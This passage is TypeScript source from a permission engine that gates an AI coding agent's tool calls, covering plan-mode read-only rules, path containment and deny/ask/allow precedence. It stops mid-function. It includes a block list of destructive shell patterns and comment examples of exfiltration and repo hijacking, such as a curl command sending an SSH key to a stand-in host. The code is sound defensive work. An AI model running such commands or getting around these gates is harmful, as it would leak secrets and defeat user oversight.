const PATH_KEYED_TOOLS: ReadonlySet<string> = new Set([
  'read',
  'edit',
  'write',
  'grep',
  'find',
  'ls'
])
const SEARCH_KEYED_TOOLS: ReadonlySet<string> = new Set(['grep', 'find', 'ls'])

/**
 * pi's "allow for this session" key: {@link sessionAllowKey}, except that the path tools
 * (`read`, `edit`, `write`, `grep`, `find`, `ls`) are scoped to ONE canonical absolute path
 * (`edit:<path>`, `read:<path>`, …) — a bare `edit` key turned one click on a harmless file into
 * a standing allow for every file, sensitive and out-of-tree ones included (H3), and a bare
 * `read`/`grep` key one click on a file outside the workspace into a standing allow for the whole
 * disk. A search without a `path` searches the cwd, and is keyed by it. Everything else (mcp,
 * `agent`, …) keeps the bare tool name; whether a standing allow may skip the judge for it is
 * {@link sessionAllowHolds}'s business, not the key's.
 *
 * The add side (PiSession.resolveApproval) and the lookup side (the ladder) both build the key
 * here, from the same input, cwd and scope, so they agree by construction. With a `scope` the
 * path is pi's own resolution of the call's `path` ({@link piResolvePath}: `@x`, `~/x`,
 * `file://…`, unicode spaces) — the very path the containment guard pins the call to — so two
 * spellings of one file share a key and two files never do. Without one (a scope-less caller) it is
 * the plain cwd-resolved form of the call's own spelling.
 */
export function piSessionAllowKey(
  toolName: string,
  input: Record<string, unknown>,
  cwd: string | undefined,
  scope?: PiPathScope
): string {
  if (!PATH_KEYED_TOOLS.has(toolName)) return sessionAllowKey(toolName, input)
  const search = SEARCH_KEYED_TOOLS.has(toolName)
  if (scope) {
    // pi reads `path` only (its schema has no alias); an edit/write/read without one touches
    // nothing, a search without one (or an empty one) searches the cwd (`searchDir || "."`).
    let arg = typeof input.path === 'string' ? input.path : undefined
    if (search && (arg === undefined || arg === '')) arg = '.'
    let canonical = arg ?? ''
    if (arg !== undefined) {
      try {
        const platform = scope.platform ?? process.platform
        canonical = piResolvePath(arg, scope.cwd, platform, scope.homeDir)
        if (platform === 'win32') canonical = canonical[0].toUpperCase() + canonical.slice(1)
      } catch {
        /* an unusable path: the raw spelling is a key that never matches a resolvable one */
      }
    }
    return `${toolName}:${canonical}`
  }
  const raw = extractToolPath(input) ?? (search ? '.' : undefined)
  let canonical = raw ?? ''
  if (raw !== undefined && cwd) {
    // `resolve`, not the rule matcher's `toAbsolutePath`: a posix backslash is a file-name
    // character and must stay one, or `a\b` and `a/b` would share a key.
    const flavor = pathFlavor(cwd)
    canonical = flavor.resolve(cwd, raw)
    if (flavor === path.win32) canonical = canonical[0].toUpperCase() + canonical.slice(1)
  }
  return `${toolName}:${canonical}`
}

/**
 * Does this edit/write target an agent-control path (ADR-084 §3)? Resolution
 * against cwd (relative inside it, absolute outside it) is the shared
 * `isAgentControlTarget`, which opencode's auto-mode edit gate uses too.
 *
 * No path at all → false: pi's edit/write schemas require one, so such a call
 * writes nothing.
 */
function editsAgentControlPath(input: Record<string, unknown>, cwd: string | undefined): boolean {
  const rawPath = extractToolPath(input)
  return rawPath !== undefined && isAgentControlTarget(rawPath, cwd)
}

// ---------------------------------------------------------------------------
// Mode base
// ---------------------------------------------------------------------------

/**
 * Mode-base decision BEFORE user rules / sessionAllows are considered:
 *  - kind 'plan' (exit_plan) OUTSIDE mode 'plan' -> deny in EVERY mode —
 *    including bypassPermissions' otherwise allow-everything base.
 *    This is full mode's ONE carve-out (M5a addendum): pi.registerTool()
 *    auto-activates the tool, so exit_plan is model-visible from spawn in
 *    every mode until the bridge extension's session_start hook hides it,
 *    and a mode-transition tool must not be model-invocable when there is
 *    no mode to exit (an auto-allowed exit_plan in full mode would return
 *    "Plan approved — proceeding." for a plan that never existed). Mirrors
 *    cli.js never offering ExitPlanMode outside plan mode.
 *  - default            -> fileRead/search allow, everything else ask
 *  - acceptEdits         -> also fileEdit/fileWrite allow, bash/unknown ask —
 *    except an edit/write whose path is an agent-control path (`.git/`,
 *    `.claude/`, CLAUDE.md, hooks, `.vscode/`, …; ADR-084 §3), which asks. In
 *    auto mode (whose base is acceptEdits) that ask reaches the judge; in plain
 *    acceptEdits the human. The same list is rendered into opencode's
 *    acceptEdits ruleset, so both engines draw the line in the same place.
 *  - bypassPermissions/full/auto -> allow everything (except the plan-kind carve-out above).
 *    A pi caller never reaches `full`/`auto` here: it passes `judge`, and {@link ladderBase}
 *    turns them into `acceptEdits` (judged) or `default` (no judge). Only a caller that does
 *    not gets the allow-everything base.
 *  - plan (M5a — real autonomy mode now, see planModeBaseDecision) -> read-only:
 *    reads/search allow, exit_plan asks, bash gated by isPlanReadOnlyCommand,
 *    everything else (fileEdit/fileWrite/task/unknown/…) denies outright
 *  - any other/unrecognised mode string -> treat as default (fail toward asking, not allowing)
 */
function modeBaseDecision(
  mode: string,
  kind: ToolKind,
  input: Record<string, unknown>,
  cwd: string | undefined,
  planScope?: PlanReadOnlyScope
): 'allow' | 'ask' | 'deny' {
  if (kind === 'plan' && mode !== 'plan') return 'deny'
  switch (mode) {
    case 'bypassPermissions':
    case 'full':
    case 'auto':
      return 'allow'
    case 'acceptEdits':
      if (kind === 'fileEdit' || kind === 'fileWrite') {
        return editsAgentControlPath(input, cwd) ? 'ask' : 'allow'
      }
      return kind === 'fileRead' || kind === 'search' ? 'allow' : 'ask'
    case 'plan':
      return planModeBaseDecision(kind, input, planScope)
    case 'default':
    default:
      return kind === 'fileRead' || kind === 'search' ? 'allow' : 'ask'
  }
}

// ---------------------------------------------------------------------------
// Plan mode (M5a) — read-only autonomy enforced by BOTH the bridge extension
// (pi-bridge-source.ts's exit_plan/cui-plan-enter/cui-plan-exit — the model
// literally never sees edit/write while planning) and this gate (defense in
// depth, and the ONLY place bash gets a command-level allowlist instead of a
// blanket ask/deny). Precedence: an explicit user deny RULE (checked first in
// decide(), see its doc comment) still overrides everything below; for a
// MUTATING call (edit/write, a bash command isPlanReadOnlyCommand cannot vouch
// for) the plan base then outranks the ask tier, session allows and the allow
// tier (ADR-085 ruling 7, planModeOutranksRules); for everything else the
// user's ask/allow rules still override the base. The hosted three
// (render_mermaid/create_mockup/show_mockup) auto-allow before mode base is
// ever consulted — they don't mutate the repo, so they stay available in plan
// mode.
// ---------------------------------------------------------------------------

/**
 * Denial reason for every plan-mode-BASE deny (a mutating kind, or an
 * unsafe/unrecognized bash command) — model-actionable, points it at the
 * exit_plan tool. An explicit user deny RULE produces its OWN, more specific
 * "Denied by permission rule: …" reason (PiSession.gateToolCallInner checks
 * that first) — this is only the mode-base fallback.
 */
export const PLAN_MODE_DENY_REASON =
  'Plan mode is read-only — present a plan and call exit_plan to proceed'

/** The same refusal for the engines with NO exit_plan tool (opencode — ADR-085 S4, S3b verifier F4):
 *  the user leaves plan mode from the mode picker. opencode's own `plan_exit` (its plan agent's tool) is
 *  model-visible but its "switch to build agent" question does not change ClaudeUI's permission mode. */
export const PLAN_MODE_DENY_REASON_NO_EXIT_TOOL =
  'Plan mode is read-only — present the plan and ask the user to leave plan mode to proceed'

/**
 * Denial reason for an exit_plan call OUTSIDE plan mode (M5a addendum) —
 * pi.registerTool() auto-activates the tool, so exit_plan is model-visible
 * from spawn in every mode until the bridge extension's session_start hook
 * hides it; this gate deny is the backstop. Wired in
 * PiSession.gateToolCallInner the same way PLAN_MODE_DENY_REASON is.
 */
export const PLAN_EXIT_OUTSIDE_PLAN_REASON = 'exit_plan is only available in plan mode'

/**
 * Destructive-anywhere-in-the-string bash patterns — ported from
 * vendor/pi-src/packages/coding-agent/examples/extensions/plan-mode/utils.ts's DESTRUCTIVE_PATTERNS
 * (the pi-shipped reference implementation this milestone's kickoff spec
 * pointed at), with ClaudeUI-specific hardening marked inline below.
 * Unanchored word-boundary matches: a destructive token ANYWHERE in a chained
 * command (`ls && rm -rf /`, `echo hi; git commit -m x`) blocks the WHOLE
 * command. This scan is the FIRST check in isPlanSafeBashCommand; the
 * per-segment safe-list validation below is the second — a chained command
 * must clear both.
 *
 * The vendor list is COMMAND-NAME oriented, which leaves a whole class of
 * mutation invisible to it: a read-only command name carrying a mutating FLAG.
 * The `-delete` / `-exec` / … entries below close that class for the safe-list
 * entries that expose it (`find`). Flag patterns are anchored with `(^|\s)-`
 * so they match a SHORT option only — `--delete` (the long form, e.g.
 * `rsync --delete`, which is not on the safe list anyway) deliberately does
 * not trip them, and neither does a filename that merely contains the word.
 */
const PLAN_DESTRUCTIVE_PATTERNS: RegExp[] = [
  /\brm\b/i,
  /\brmdir\b/i,
  /\bmv\b/i,
  /\bcp\b/i,
  /\bmkdir\b/i,
  /\btouch\b/i,
  /\bchmod\b/i,
  /\bchown\b/i,
  /\bchgrp\b/i,
  /\bln\b/i,
  /\btee\b/i,
  /\btruncate\b/i,
  /\bdd\b/i,
  /\bshred\b/i,
  /(^|[^<])>(?!>)/,
  />>/,
  /\bnpm\s+(install|uninstall|update|ci|link|publish)/i,
  /\byarn\s+(add|remove|install|publish)/i,
  /\bpnpm\s+(add|remove|install|publish)/i,
  /\bpip\s+(install|uninstall)/i,
  /\bapt(-get)?\s+(install|remove|purge|update|upgrade)/i,
  /\bbrew\s+(install|uninstall|upgrade)/i,
  // ClaudeUI hardening: `branch -[mMcC]` (rename/copy a ref) joins the
  // vendor's `-[dD]`, and the ref-mutating `git remote` subcommands join the
  // list — `branch` and `remote` are both on the safe list for their LISTING
  // forms, so without these a `git remote add origin <attacker url>` scanned
  // clean and then matched `^git remote`.
  /\bgit\s+(add|commit|push|pull|merge|rebase|reset|checkout|branch\s+-[dDmMcC]|stash|cherry-pick|revert|tag|init|clone)/i,
  /\bgit\s+remote\s+(add|remove|rm|rename|set-url|set-head|set-branches|prune|update)\b/i,
  // ClaudeUI hardening (flag-level mutation — see this list's doc comment):
  // `find … -delete` deletes; `-exec`/`-execdir`/`-ok`/`-okdir` run an
  // arbitrary nested command (the `\;` terminator happens to be caught by the
  // per-segment splitter, but the `{} +` form is not); `-fprint`/`-fprintf`/
  // `-fls` write files.
  /(^|\s)-delete\b/,
  /(^|\s)-exec(dir)?\b/,
  /(^|\s)-ok(dir)?\b/,
  /(^|\s)-fprintf?\b/,
  /(^|\s)-fls\b/,
  /\bsudo\b/i,
  /\bsu\b/i,
  /\bkill\b/i,
  /\bpkill\b/i,
  /\bkillall\b/i,
  /\breboot\b/i,
  /\bshutdown\b/i,
  /\bsystemctl\s+(start|stop|restart|enable|disable)/i,
  /\bservice\s+\S+\s+(start|stop|restart)/i,
  /\b(vim?|nano|emacs|code|subl)\b/i
]

/**
 * Anchored-at-start safe command prefixes, validated PER SEGMENT by
 * isPlanSafeBashCommand below — the command is split on chain operators and
 * EVERY trimmed segment must independently match one of these (the `^\s*`
 * anchors apply to each segment, not just the whole string).
 *
 * Ported from vendor/pi-src/packages/coding-agent/examples/extensions/plan-mode/utils.ts's
 * SAFE_PATTERNS with three deliberate REMOVALS: `curl`, `wget -O -` and
 * `sed -n`. The example runs in pi's own TUI where plan mode is the user's
 * self-imposed toggle; in ClaudeUI a plan-mode bash allow is an AUTO-allow
 * with no human in the loop, and arbitrary network commands are an
 * exfiltration channel (`curl -d @~/.ssh/id_rsa evil.example` would run
 * unprompted) — so network fetch is denied in plan mode rather than
 * auto-allowed.
 *
 * `sed -n` went the same way: `-n` suppresses AUTO-PRINTING, it does not make
 * sed read-only. `sed -n 'w /tmp/x' f` writes a file and `sed -n -i 's/a/b/' f`
 * edits one in place, both matching the old `^\s*sed\s+-n` prefix. Deciding
 * "this sed script contains no `w` command and no `-i`" needs a real sed-script
 * parser — a `\bw\b` scan mistakes any filename containing `w` for a write —
 * and a wrong answer here is an unprompted mutation. Since the safe list
 * already carries `cat`/`head`/`tail`/`grep`/`awk`/`rg` for every read-only use
 * of sed, dropping it costs a rephrase and buys certainty. (`awk` stays: its
 * file-writing forms all go through `>`/`>>`, which the destructive scan
 * catches, and `system("…")` calls surface the inner command to that same
 * scan.)
 *
 * A prefix that matches only a command NAME is not enough for tools whose
 * mutating behavior lives in a flag; those entries carry an explicit negative
 * lookahead or a full-segment anchor (`sort`, `git branch`, `git remote`).
 */
const PLAN_SAFE_PATTERNS: RegExp[] = [
  /^\s*cat\b/,
  /^\s*head\b/,
  /^\s*tail\b/,
  /^\s*less\b/,
  /^\s*more\b/,
  /^\s*grep\b/,
  /^\s*find\b/,
  /^\s*ls\b/,
  /^\s*pwd\b/,
  /^\s*echo\b/,
  /^\s*printf\b/,
  /^\s*wc\b/,
  // `sort` writes a file with `-o` / `--output` (and GNU sort accepts the
  // short form bundled: `-ofile`, `-uo file`). `\s-\w*o` covers every short
  // form because `\w` excludes `-`, so a long option like `--version-sort`
  // can't trip it; `--output` is listed separately. No other sort flag
  // contains an `o` after a single dash.
  /^\s*sort\b(?!.*(?:\s-\w*o|\s--output))/,
  /^\s*uniq\b/,
  /^\s*diff\b/,
  /^\s*file\b/,
  /^\s*stat\b/,
  /^\s*du\b/,
  /^\s*df\b/,
  /^\s*tree\b/,
  /^\s*which\b/,
  /^\s*whereis\b/,
  /^\s*type\b/,
  /^\s*env\b/,
  /^\s*printenv\b/,
  /^\s*uname\b/,
  /^\s*whoami\b/,
  /^\s*id\b/,
  /^\s*date\b/,
  /^\s*cal\b/,
  /^\s*uptime\b/,
  /^\s*ps\b/,
  /^\s*top\b/,
  /^\s*htop\b/,
  /^\s*free\b/,
  /^\s*git\s+(status|log|diff|show|config\s+--get)/i,
  // `git branch` and `git remote` are read-only ONLY in their listing forms.
  // The bare `branch`/`remote` prefixes the vendor example used also matched
  // `git branch <new-name>` (creates a ref), `git branch -m a b` (renames one)
  // and `git remote add origin <url>` (adds a push target) — repo mutations
  // auto-allowed in a "read-only" mode. Anchored to the END of the segment and
  // restricted to listing flags, so any positional argument (a branch name, a
  // remote name + URL) falls through to the plan-mode deny. `show`/`get-url`
  // are the two `git remote` subcommands that only READ, and they legitimately
  // take a remote name.
  /^\s*git\s+branch(\s+(-v|-vv|-a|-r|-l|--list|--all|--remotes|--verbose|--show-current))*\s*$/i,
  /^\s*git\s+remote(\s+(-v|--verbose))*\s*$/i,
  /^\s*git\s+remote\s+(show|get-url)\b/i,
  /^\s*git\s+ls-/i,
  /^\s*npm\s+(list|ls|view|info|search|outdated|audit)/i,
  /^\s*yarn\s+(list|info|why|audit)/i,
  /^\s*node\s+--version/i,
  /^\s*python\s+--version/i,
  /^\s*jq\b/,
  // NOTE: `sed -n` was REMOVED — see this list's doc comment (`-n` suppresses
  // auto-printing, it does not make sed read-only).
  /^\s*awk\b/,
  /^\s*rg\b/,
  /^\s*fd\b/,
  /^\s*bat\b/,
  /^\s*eza\b/
]

/**
 * Chain operators the per-segment validation splits on: `&&`, `||`, `;`,
 * `|`. Alternation order matters — `&&`/`||` before the single-char `|` so
 * `a && b` yields two segments, not three.
 */
const PLAN_CHAIN_SPLIT = /&&|\|\||;|\|/

/**
 * Constructs that defeat flat segment parsing — command substitution
 * (backticks, `$(`), process substitution (`<(`) and embedded newlines can
 * smuggle an arbitrary nested command past the per-segment check, so their
 * mere presence denies the whole command.
 */
const PLAN_UNPARSEABLE = /[`\n]|\$\(|<\(/

/**
 * Is `command` allowed in plan mode's bash gate? A plan-mode bash allow is
 * an AUTO-allow — no human in the loop (default mode would at least ask) —
 * so this is strictly deny-when-unsure, three checks in order:
 *
 *  1. Any destructive pattern ANYWHERE in the string denies
 *     (PLAN_DESTRUCTIVE_PATTERNS — catches chained/embedded mutations like
 *     `ls && rm -rf /` regardless of segment parsing).
 *  2. Any parse-defeating construct (backticks, `$(`, `<(`, newlines)
 *     denies outright (PLAN_UNPARSEABLE).
 *  3. The command is split on `&&`/`||`/`;`/`|` and EVERY trimmed segment
 *     must be non-empty AND match a PLAN_SAFE_PATTERN — a chain is only as
 *     safe as its least safe segment. An empty or unrecognized command
 *     matches no SAFE_PATTERN and is denied; a trailing operator (`ls &&`)
 *     leaves an empty segment and is denied.
 *
 * Known over-denial (accepted — it errs toward deny, never toward allow):
 * the splitter is quote-blind, so a chain operator INSIDE a quoted argument
 * over-splits — `grep "a && b" file.txt` becomes segments `grep "a` /
 * `b" file.txt`, and the second fails the safe check. The model receives
 * the plan-mode deny reason and can rephrase the query.
 */
export function isPlanSafeBashCommand(command: string): boolean {
  if (PLAN_DESTRUCTIVE_PATTERNS.some((p) => p.test(command))) return false
  if (PLAN_UNPARSEABLE.test(command)) return false
  return command.split(PLAN_CHAIN_SPLIT).every((segment) => {
    const trimmed = segment.trim()
    return trimmed.length > 0 && PLAN_SAFE_PATTERNS.some((p) => p.test(trimmed))
  })
}

/** What the second oracle needs (ADR-084 `ReadOnlyScope` minus what the engine already holds). */
export interface PlanReadOnlyScope {
  cwd: string
  additionalDirectories: readonly string[]
  /**
   * The user's DENY tier only. Read-only-ness must not depend on the user's allow or ask rules:
   * a Bash deny hit is answered by the deny rung before the oracle runs (the checker refusing it
   * again only re-denies), and a Bash ASK hit must not turn a checker-only read-only command into
   * a refusal instead of a question — the ask rung decides that. The deny tier stays so the
   * checker's `Read(...)` deny rules on reader paths keep refusing.
   */
  rules: { deny: readonly string[] }
  /** Default `process.platform`. */
  platform?: NodeJS.Platform
  /** Default `hostRealpath` (`read-only-gate.ts`); tests inject. */
  realpath?: (absPath: string) => string | undefined | null
}

/**
 * ADR-085 S3b — plan mode's read-only oracle: pi's plan-safe list
 * ({@link isPlanSafeBashCommand}) OR ADR-084's static read-only checker
 * (`readOnlyVerdict(...).ok` — sync, no armed-git capture). A command is
 * plan-read-only when EITHER says so. Without a scope (no cwd) only the list
 * decides. Used everywhere the plan line is drawn: the plan rung and the plan
 * base on pi / the dispatcher's pi targets, and opencode's
 * host pre-check and dispatch targets (`planModeRefusesAsk`).
 *
 * Why a union: both are read-only checkers, and each knows commands the other
 * does not. pi's list is bash-only, so on opencode under Windows — which runs
 * pwsh by default — `Get-ChildItem` / `Get-Content` / `Select-String`
 * research would be refused outright; the ADR-084 checker knows those cmdlets,
 * and is quote-aware (`grep "a && b" f`, which the list's quote-blind splitter
 * over-denies).
 *
 * Stated honestly:
 *  (a) the union is only as strict as the LOOSER oracle. For a program pi's
 *      list passes (`cat`, `head`, `grep`, `find`, `ls`, …) the checker's
 *      secret-path and out-of-scope refusals do NOT apply: `cat .env` and
 *      `cat ../outside` pass, as pi's plan mode already let them before this
 *      slice (pre-existing, recorded). Plan mode is about mutation, not
 *      secrecy — the `read` tool reads the same files;
 *  (b) the checker's `needsGitCheck` (an armed git config: aliases, pager,
 *      fsmonitor) is not run here — pi's list allows `git status` without it
 *      today;
 *  (c) commands neither knows stay refused: `cd src && ls` (`cd` is unknown to
 *      both — and deliberately not taught to the ADR-084 checker, which auto
 *      mode's judge skip also uses), `sed -n …`, `bun run test`.
 *
 * The checker gets the user's deny tier only (`ask: []`, `allow: []` — see
 * {@link PlanReadOnlyScope}'s `rules`): a user ask rule on a command only the
 * checker knows (`Bash(Get-Content:*)`) must reach the ask rung and ask, not
 * make plan mode refuse the command. Its `Read(...)` deny rules still refuse a
 * denied reader path — which matters only for programs pi's list does not
 * pass (the union residual, (a)).
 */
export function isPlanReadOnlyCommand(
  action: { toolName: string; input: Record<string, unknown> },
  scope?: PlanReadOnlyScope
): boolean {
  if (isPlanSafeBashCommand(commandOf(action.input))) return true
  if (scope === undefined) return false
  return readOnlyVerdict(action, {
    cwd: scope.cwd,
    additionalDirectories: [...scope.additionalDirectories],
    platform: scope.platform ?? process.platform,
    rules: { deny: [...scope.rules.deny], ask: [], allow: [] },
    realpath: scope.realpath ?? hostRealpath
  }).ok
}

/**
 * Plan mode's own base (M5a) — read-only autonomy: reads/search always
 * allow; the 'plan' kind (exit_plan itself) always asks — that's the
 * approval that renders ExitPlanModeCard; bash is allow/deny by
 * {@link isPlanReadOnlyCommand} (pi's plan-safe list, or with a scope also
 * ADR-084's read-only checker — ADR-085 S3b; the rung and the base use the
 * same oracle so they cannot disagree); every other kind (fileEdit/fileWrite/task/mcp/
 * unknown/…) denies outright — plan mode has no interactive 'ask' tier of
 * its own beyond exit_plan. An explicit user deny RULE still overrides this
 * (checked first in decide()); for the mutating kinds — fileEdit/fileWrite
 * and a bash command that is not plan-read-only — NOTHING else does (ADR-085
 * ruling 7: {@link planModeOutranksRules} answers them right after the deny
 * rung). For the remaining kinds (task/mcp/unknown/…) a user ask/allow rule
 * still overrides the base deny.
 */
function planModeBaseDecision(
  kind: ToolKind,
  input: Record<string, unknown>,
  scope?: PlanReadOnlyScope
): 'allow' | 'ask' | 'deny' {
  if (kind === 'fileRead' || kind === 'search') return 'allow'
  if (kind === 'plan') return 'ask'
  if (kind === 'command')
    return isPlanReadOnlyCommand({ toolName: 'bash', input }, scope) ? 'allow' : 'deny'
  return 'deny'
}

/**
 * ADR-085 ruling 7 — the plan-mode base OUTRANKS the ask tier, session allows and the allow
 * tier for a mutating call: a file edit/write, or a shell command {@link isPlanReadOnlyCommand}
 * cannot vouch for. Reads, search, plan-read-only bash, the hosted tools and every other kind
 * keep today's ladder.
 *
 * Plan mode is the read-only autonomy tier; a user allow rule (`Edit`, `Bash(git:*)`) or an
 * "allow for this session" click says "don't interrupt me for this", not "this is read-only", so
 * neither may turn a plan-mode edit or `git commit` back into an allow. Read-only-ness of a
 * command is decided by the same oracle plan mode's base already uses (deny-when-unsure) — and
 * opencode's host pre-check (`opencode/host-precheck.ts` `planModeRefusesAsk`) shares it, so
 * every engine draws the line in one place.
 */
export function planModeOutranksRules(
  kind: ToolKind,
  input: Record<string, unknown>,
  scope?: PlanReadOnlyScope
): boolean {
  if (kind === 'fileEdit' || kind === 'fileWrite') return true
  if (kind === 'command') return !isPlanReadOnlyCommand({ toolName: 'bash', input }, scope)
  return false
}

// ---------------------------------------------------------------------------
// decide()
// ---------------------------------------------------------------------------

/**
 * Decide allow/ask/deny for one pi tool_call. The ladder itself lives in
 * {@link decideWithSource}; this is the provenance-free projection of it that
 * every pre-auto-mode caller wants.
 *
 * Precedence — severity wins, deny(3) > hosted-auto-allow > ask(2) >
 * allow(1): any matching deny rule -> 'deny'; else, in plan mode, a mutating
 * call (edit/write, a bash command that is not plan-read-only —
 * {@link planModeOutranksRules}, ADR-085 ruling 7) -> 'deny' with
 * `source: 'mode-base'`; else a hosted LLM tool
 * (PI_AUTO_ALLOW_HOSTED_TOOLS, M4a) -> 'allow'; else any matching ask rule ->
 * 'ask'; else sessionAllows or a matching allow rule -> 'allow'; else the
 * mode base. The plan rung means that in plan mode an explicit user ASK rule
 * no longer surfaces a card for an edit/write/unsafe command, and a session
 * allow no longer allows one — the call is refused with the plan reason
 * (opencode refuses those host-side before any ask rule too: engine parity).
 * This mirrors Claude's own deny > ask > allow precedence
 * (ADR-022 gives opencode the identical property) and keeps a deny/ask rule
 * meaningful even in `full` mode — an "allow everything" autonomy mode is
 * still not a bypass of an explicit user rule. The hosted-tool short-circuit
 * sits directly below deny (so an explicit user deny still wins) and above
 * everything else (so render_mermaid/create_mockup/show_mockup never prompt
 * or depend on mode/rules) — see PI_AUTO_ALLOW_HOSTED_TOOLS' doc comment.
 *
 * PATH CONTAINMENT (H1, `ctx.scope`; pi callers only). After the deny tier: an edit through a
 * symbolic link and a read the read block refuses are denied (`path-scope`); after the ask tier a
 * path that cannot be placed, a Windows path trick and a link-carried edit are HUMAN-ONLY asks
 * (`path-scope`, never the judge's); the session allow follows, then the ask for a sensitive edit
 * (an agent-control path: Claude's order, so an allow rule never silences it), then the allow tier
 * and the base, the base per {@link scopedBase}'s table. The additional directories reach the ladder as the
 * scope's roots (`buildPiPathScope`), not through `ctx.rules.additionalDirectories`, which this
 * function still does not read (the auto-mode read-only gate and opencode's `external_directory`
 * consume it elsewhere). A call with no scope has no notion of "outside the workspace".
 *
 * `ctx.rules.defaultMode` is DELIBERATELY not consulted here — merged into `MergedClaudeRules`
 * (so its presence is harmless/inert) but not acted on: unconsumed on the opencode side too
 * (OpencodeSession.ts merges it into its own rules struct and never reads it back) — there is no
 * cross-engine parity behavior to mirror. Claude Code itself uses `defaultMode` to pick a NEW
 * session's STARTING permission mode when the user hasn't chosen one — a session-bootstrap
 * concern for whoever constructs `PiSession`'s initial `this.permissionMode`, not a per-call
 * concern for `decide()` (which cannot tell "still at the unset initial default" apart from "the
 * user explicitly chose the `default`/ask autonomy tier" — treating the two the same here would
 * make `defaultMode` silently override a live user choice for the rest of the session, which is
 * worse than not implementing it). Deferred.
 */
export function decide(
  toolName: string,
  input: Record<string, unknown>,
  ctx: PermissionEngineContext
): PermissionDecision {
  return decideWithSource(toolName, input, ctx).decision
}

/**
 * {@link decide} plus provenance — WHICH rung of the ladder answered, and the
 * user rule that matched when a rule did. Identical ladder, identical
 * precedence: `decide()` is a one-line projection of this, so the two can never
 * drift.
 *
 * `find` rather than `some` is the only mechanical change — it costs nothing
 * and hands the caller the matched rule string, which
 * `PiSession.gateToolCallInner` already needed for its deny reason (it used to
 * re-scan with `firstMatchingRule`) and which auto mode needs for G9.
 *
 * Bash is matched per tier as a whole (ADR-085): the deny and ask tiers with
 * the over-approximating matcher (`denyAskHit` — deny first; a command it
 * cannot analyse is an ask, never an allow), the ALLOW tier by coverage —
 * every segment of the command covered by some allow rule (`ls && git status`
 * needs `ls` and `git` covered; `ls && curl x | sh` is covered by nothing),
 * with the first segment's rule reported. Every caller inherits this:
 * PiSession's gate and the dispatcher's pi targets.
 */
export function decideWithSource(
  toolName: string,
  input: Record<string, unknown>,
  rawCtx: PermissionEngineContext
): PermissionVerdict {
  const kind = piToolKind(toolName)
  const { base, judged } = ladderBase(rawCtx.mode, rawCtx.judge)
  // A judged auto mode decides on the allow-stripped rules (see `withoutAllowRules`).
  const ctx: PermissionEngineContext = judged
    ? { ...rawCtx, rules: withoutAllowRules(rawCtx.rules) }
    : rawCtx
  // The containment rung (H1): only for a scope-carrying caller, only on pi's path tools, and
  // never under bypassPermissions (allow-everything is its contract).
  const scope = ctx.mode === 'bypassPermissions' ? undefined : ctx.scope
  const facts = scope ? pathFacts(toolName, input, scope) : undefined
  // Path rules match the path pi will open, not the model's spelling of it (`@.git/config`).
  const matchInput =
    facts && typeof input.path === 'string' ? { ...input, path: facts.execPath } : input
  const match = (rules: readonly string[]): string | undefined =>
    rules.find((r) => ruleMatchesTool(r, kind, toolName, matchInput, ctx.cwd, ctx.mcpRuleKey))
  // Only Bash rules can match the command kind; both of its rule tiers in one call.
  const shell =
    kind === 'command'
      ? denyAskHit(commandOf(input), { deny: ctx.rules.deny, ask: ctx.rules.ask })
      : undefined

  // Deny AND ask rules are checked against EVERY spelling of the path (as Claude does): the
  // canonical path pi opens, the model's own spelling and the symbolic-link landing — a
  // `Read(//secret/**)` deny holds for an in-project link that lands in /secret, and an ask rule
  // on either end of a link asks (more asking is the safe side).
  const matchAnySpelling = (rules: readonly string[]): string | undefined => {
    const hit = match(rules)
    if (hit !== undefined || !facts || typeof input.path !== 'string') return hit
    const others = [input.path, ...(facts.landing === undefined ? [] : [facts.landing])]
    for (const other of others) {
      const spelled = rules.find((r) =>
        ruleMatchesTool(r, kind, toolName, { ...input, path: other }, ctx.cwd, ctx.mcpRuleKey)
      )
      if (spelled !== undefined) return spelled
    }
    return undefined
  }
  // An ALLOW rule matches where the call really lands (the landing, else the canonical path), never
  // the spelling of a link that can be pointed elsewhere: `Read(//repo/lnk/**)` does not allow a
  // read through `lnk`, `Read(//elsewhere/**)` does when `lnk` lands there. The landing also
  // counts under the logical spelling of a scope root that is itself reached through a link
  // (`facts.landingAliases`: the same physical file), so `Edit(src/**)` still matches in a project
  // directory that is a link.
  const matchAllow = (rules: readonly string[]): string | undefined =>
    facts?.landing !== undefined && typeof input.path === 'string'
      ? [facts.landing, ...(facts.landingAliases ?? [])]
          .map((p) =>
            rules.find((r) =>
              ruleMatchesTool(r, kind, toolName, { ...input, path: p }, ctx.cwd, ctx.mcpRuleKey)
            )
          )
          .find((hit) => hit !== undefined)
      : match(rules)
  const denyRule = kind === 'command' ? tierRule(shell, 'deny') : matchAnySpelling(ctx.rules.deny)
  if (denyRule !== undefined) return { decision: 'deny', source: 'deny-rule', rule: denyRule }
  if (scope && facts) {
    // Claude's `_he`: an edit through a symbolic link is refused in every mode (the link's own
    // target is the file to name) — and so is a dangling link, which could point anywhere.
    if (facts.write && facts.leafIsSymlink) {
      return {
        decision: 'deny',
        source: 'path-scope',
        pathReason: 'symlink',
        message: symlinkWriteMessage(facts.execPath)
      }
    }
    // The read block is a fence, not a preference: a deny, whatever the mode, and nothing below
    // (a session allow, an allow rule, the judge) can lift it.
    if (
      scope.blockOutsideReads &&
      !facts.write &&
      (!facts.inFence || facts.state === 'unresolved')
    ) {
      return {
        decision: 'deny',
        source: 'path-scope',
        pathReason: 'read-block',
        message: readBlockMessage(facts, scope)
      }
    }
  }
  // ADR-085 ruling 7 — plan mode wins over every rung below for a mutating call: a user ask rule
  // no longer surfaces a card for it, and neither a session allow nor an allow rule allows it.
  // The deny rung stays above (a user deny gives the more specific reason). `mode-base` so the
  // callers (PiSession's gate, the dispatcher's pi targets) attach
  // PLAN_MODE_DENY_REASON unchanged. Auto mode never reaches this (`ctx.mode` is `plan` here).
  // The second read-only oracle needs the session's scope (ADR-085 S3b); without a cwd only
  // pi's plan-safe list decides.
  const planScope: PlanReadOnlyScope | undefined =
    ctx.mode === 'plan' && ctx.cwd
      ? {
          cwd: ctx.cwd,
          additionalDirectories: ctx.rules.additionalDirectories ?? [],
          rules: { deny: ctx.rules.deny },
          platform: ctx.platform,
          realpath: ctx.realpath
        }
      : undefined
  if (ctx.mode === 'plan' && planModeOutranksRules(kind, input, planScope))
    return { decision: 'deny', source: 'mode-base' }
  if (PI_AUTO_ALLOW_HOSTED_TOOLS.has(toolName)) {
    return { decision: 'allow', source: 'hosted-auto-allow' }
  }
  const askRule = kind === 'command' ? tierRule(shell, 'ask') : matchAnySpelling(ctx.rules.ask)
  if (askRule !== undefined) {
    return {
